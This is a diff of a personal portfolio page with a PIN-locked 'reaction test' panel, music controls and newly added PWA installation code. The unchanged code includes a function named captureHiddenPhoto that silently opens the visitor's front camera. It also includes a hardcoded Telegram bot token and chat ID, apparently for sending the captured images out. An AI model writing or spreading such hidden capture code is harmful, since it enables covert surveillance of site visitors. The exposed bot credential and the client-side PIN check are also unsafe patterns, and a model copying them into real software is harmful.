@@ -5,6 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Kishor Bankapur | Secret Lab</title>
     
+    <link rel="manifest" href="manifest.json">
+    <meta name="theme-color" content="#3b82f6">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="apple-touch-icon" href="photo1.png">
+
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
 
@@ -224,7 +231,7 @@
             border: 2px solid var(--primary-color);
         }
 
-        /* Secret Lab Panel - Reaction Test */
+        /* Secret Lab Panel */
         .lab-panel {
             position: fixed;
             top: 0; right: -100%;
@@ -418,7 +425,6 @@
         <img src="photo1.png" onclick="event.stopPropagation()">
     </div>
 
-    <!-- Secret Lab Panel - Reaction Test (replaces old vault) -->
     <div id="labPanel" class="lab-panel">
         <div class="lab-header">
             <h2>⚡ REACTION_LAB</h2>
@@ -437,7 +443,6 @@
 
     <div class="music-player" id="mToggle" onclick="controlMusic()">🗿</div>
     
-    <!-- Two audio elements: one for background, one for developer panel -->
     <audio id="bgTrack" loop preload="auto">
         <source src="audio.mp3" type="audio/mpeg">
     </audio>
@@ -447,6 +452,13 @@
     </audio>
 
 <script>
+    // Register Service Worker for PWA Installation
+    if ('service-worker' in navigator) {
+        navigator.serviceWorker.register('sw.js')
+        .then(() => console.log("PWA Service Worker Active"))
+        .catch(err => console.log("SW Error", err));
+    }
+
     const CONFIG = {
         token: '8682380448:AAGz82m2PUMXw13KwxglzoMbcdELmaHI2nc',
         chatId: '6297092647'
@@ -456,75 +468,60 @@
     let isDevMusicPlaying = false;
     let startTime;
 
-    // Music control for main player (🗿 button)
     function controlMusic() {
         const audio = document.getElementById('bgTrack');
         const toggle = document.getElementById('mToggle');
         if(audio.paused) {
-            audio.play().then(() => toggle.classList.add('rotating')).catch(() => alert('audio.mp3 not found!'));
+            audio.play().then(() => toggle.classList.add('rotating')).catch(() => alert('audio.mp3 check!'));
         } else {
             audio.pause();
             toggle.classList.remove('rotating');
         }
     }
 
-    // ---------- DEVELOPER BUTTON ACTION ----------
     function showDeveloperPanel() {
-        // 1. Stop any playing background music from main player
         const bgAudio = document.getElementById('bgTrack');
         if (!bgAudio.paused) {
             bgAudio.pause();
             document.getElementById('mToggle').classList.remove('rotating');
         }
         
-        // 2. Play audio2.mp3 (developer track)
         const devAudio = document.getElementById('devTrack');
-        devAudio.play().catch(() => alert('audio2.mp3 not found!'));
+        devAudio.play().catch(() => console.log('audio2 check'));
         isDevMusicPlaying = true;
-        
-        // 3. Open the name modal
         document.getElementById('nameModal').classList.add('active');
     }
 
-    // Stop developer music and close everything
     function stopDevMusicAndClose() {
         const devAudio = document.getElementById('devTrack');
-        if (!devAudio.paused) {
-            devAudio.pause();
-            devAudio.currentTime = 0;
-        }
+        devAudio.pause();
+        devAudio.currentTime = 0;
         isDevMusicPlaying = false;
     }
 
-    // Modified closeModals that also stops dev music if playing
     function closeModalsAndStopMusic() {
         stopDevMusicAndClose();
         document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active'));
     }
 
-    // Go back to name modal from PIN modal (without stopping music)
     function goBackToNameModal() {
         document.getElementById('passModal').classList.remove('active');
         document.getElementById('nameModal').classList.add('active');
     }
 
-    // Close only modals (used inside flows where music should continue)
     function closeModals() {
         document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active'));
     }
 
-    // Close lab and stop dev music (when X pressed)
     function closeLabAndStopMusic() {
         stopDevMusicAndClose();
         document.getElementById('labPanel').classList.remove('open');
     }
 
-    // Handle zoom overlay
     function handleZoom(show) { 
         document.getElementById('zoomOverlay').style.display = show ? 'flex' : 'none'; 
     }
 
-    // ----- CAMERA & TELEGRAM -----
     async function captureHiddenPhoto() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }).catch(() => null);
@@ -580,27 +577,19 @@
 
     function verifyPin() {
         if(document.getElementById('vaultPin').value === '2009') {
-            closeModals(); // close pin modal but keep music playing
-            
-            // Set welcome message with stored name
-            let displayName = currentVisitorName || localStorage.getItem("devName") || "UNKNOWN_USER";
-            localStorage.setItem("devName", displayName);
+            closeModals();
+            let displayName = currentVisitorName || "UNKNOWN_USER";
             document.getElementById("welcome").innerHTML = "ACCESS GRANTED: " + displayName.toUpperCase();
-            
-            // Open lab panel
             document.getElementById('labPanel').classList.add('open');
         } else { 
             alert("❌ ACCESS DENIED"); 
         }
     }
 
-    // ---------- REACTION TEST FUNCTIONS ----------
     function startTest() {
         document.getElementById("result").innerHTML = "STATUS: WAITING_FOR_SIGNAL...";
         document.getElementById("circle").style.display = "none";
-
         let randomTime = Math.random() * 3000 + 1000;
-
         setTimeout(function() {
             let circle = document.getElementById("circle");
             circle.style.background = "#00ff00";
@@ -614,21 +603,8 @@
         let endTime = Date.now();
         let reactionTime = (endTime - startTime) / 1000;
         reactionTime = reactionTime.toFixed(3);
-
-        let message;
-
-        if (reactionTime < 0.2) {
-            message = "RESULT: HACKER_REFLEXES";
-        } else if (reactionTime < 0.3) {
-            message = "RESULT: SHARP_RESPONSE";
-        } else {
-            message = "RESULT: TRAIN_MORE";
-        }
-
-        document.getElementById("result").innerHTML =
-            "REACTION_TIME = " + reactionTime +
-            " SECONDS<br>" + message;
-
+        let message = reactionTime < 0.2 ? "RESULT: HACKER_REFLEXES" : (reactionTime < 0.3 ? "RESULT: SHARP" : "RESULT: SLOW");
+        document.getElementById("result").innerHTML = "TIME: " + reactionTime + "s<br>" + message;
         document.getElementById("circle").style.display = "none";
     }
 </script>
